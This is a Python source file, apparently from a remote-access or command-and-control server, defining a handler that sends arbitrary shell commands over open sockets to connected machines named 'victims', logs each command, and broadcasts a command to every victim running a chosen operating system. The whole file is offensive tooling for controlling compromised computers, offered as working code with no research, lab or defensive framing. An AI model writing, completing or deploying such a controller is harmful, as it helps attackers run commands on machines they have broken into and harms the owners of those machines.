# server/handlers/command_handler.py
import json
import threading

from handlers.activity_logger import ActivityLogger

activity_logger = ActivityLogger()


class CommandHandler:
    def __init__(self, victim_manager):
        self.victim_mgr = victim_manager

    def execute_on_victim(self, victim_id, command):
        sock = self.victim_mgr.get_socket(victim_id)
        if not sock:
            return {'error': 'Victim not connected', 'victim_id': victim_id}
        try:
            if not command.endswith('\n'):
                command += '\n'
            sock.sendall(command.encode('utf-8'))
            # Log the command
            activity_logger.log_shell_command(victim_id, command.strip())
            return {'status': 'sent', 'victim_id': victim_id, 'command': command.strip()}
        except Exception as e:
            return {'error': str(e), 'victim_id': victim_id}

    def execute_on_os(self, os_type, command):
        victims = self.victim_mgr.get_by_os(os_type)
        results = []
        for v in victims:
            res = self.execute_on_victim(v['id'], command)
            results.append(res)
        return results